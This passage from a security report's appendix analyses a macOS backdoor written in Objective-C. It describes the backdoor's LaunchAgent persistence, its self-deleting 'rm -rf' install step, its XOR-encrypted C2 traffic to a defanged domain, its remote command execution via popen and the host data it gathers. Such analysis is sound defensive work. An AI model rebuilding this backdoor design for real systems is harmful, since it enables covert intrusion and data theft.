 MD5:                               cf1815491d41202eb8647341a8695e1e
</table>

The module is written in Objective C language and contains 5 classes: AppDelegate, UCHostInf,
UCNet, UCUpDownload, KEYLogger.


The “KEYLogger” class appears to be incomplete. It is only able to get information about active
modifier keys and writes data to a log file: “$HOME/Library/log.log”



<footer>65</footer>
                                                                                            
<header>APPENDIX D</header>



When started, the module launches an application: “%application’s bundle path%/Contents/
Resources/.launchd.app” This code seems to be reused from the dropper module.


Then, it proceeds with installation. Once the installation is finished, it starts its main thread
(“UCServerThread” function) in an infinite loop.
</section>
<section>
    <heading>INSTALLATION</heading>


The module checks if its bundle directory is located in “/Users/%username%/” and if not it copies
the bundle to that directory.


It also writes the command “rm -rf %original bundle path%” to the file “/Users/%username%/.launchd.
app/config.dat”. This command is then executed by the installed copy of the backdoor, effectively
removing the original bundle directory.


Then, it creates a file “$HOME/Library/LaunchAgents/apple.launchd.plist” with all the parameters
required to launch the backdoor every time the system starts.
</section>
<section>
  <heading>MAIN THREAD</heading>


The module retrieves host information and host name and uploads this information to the C2 server.
All data sent to the C&C server is encrypted with the hardcoded XOR key “*&~^%@0hh8979”.


First, it makes a POST request with URL “hxxp://appst0re.net/upload.
aspx?filepath=ok&filename=%hostname%.jpg”. After that, it requests commands from the C&C
server. If no data was received, it tries again after sleeping for 120 seconds.


The module requests new commands by making a POST request to the C&C server by URL “hxxp://
appst0re.net/upload.aspx?filepath=order&filename=%hostname%.jpg” and then executes the
command:

<table>
       COMMAND                                              DESCRIPTION
 upload                 Download the file from the C&C server and save it to disk
 download               Upload the file to the C&C server
 cmd                    Execute command via “popen” function, upload results to the C&C server

</table>

<footer>66</footer>

<header>Appendix D</header>



Information retrieved from the system:

    >>host name

    >>OS name

    >>OS version string

    >>process information

    >>IP addresses

    >>system uptime

    >>host date/time



C&C server: hxxp://appst0re.net

C&C URLs: hxxp://appst0re.net/upload.aspx?filepath=%order/ok/arbitrary
name%&filename=%hostname%.jpg
</section>
<section>
  <heading>CLASS STRUCTURE</heading>
<list>

AppDelegate (main)

	         -[AppDelegate applicationDidFinishLaunching:]

	         -[AppDelegate UCServerThread:]

	         -[AppDelegate window]

	         -[AppDelegate setWindow:]	


UCHostInf

	         +[UCHostInf GetHostName]

	         +[UCHostInf GetHostInfo]

UCNet

	         +[UCNet HttpGet:PostData:Error:]	

	         +[UCNet HttpGetSimple:Error:]

	         +[UCNet HttpPost:PostData:Error:]


<footer>67</footer>
                                                      
<header>APPENDIX D</header>


	     +[UCNet HttpPostSimple:Error:]

UCUpDownLoad

	     +[UCUpDownLoad UpLoadFile:FileName:FileData:]

	     +[UCUpDownLoad DownLoadFile:FileName:]

KEYLogger

	     +[KEYLogger keyLogger]
</list>
</section>



<footer>68</footer>

</doc>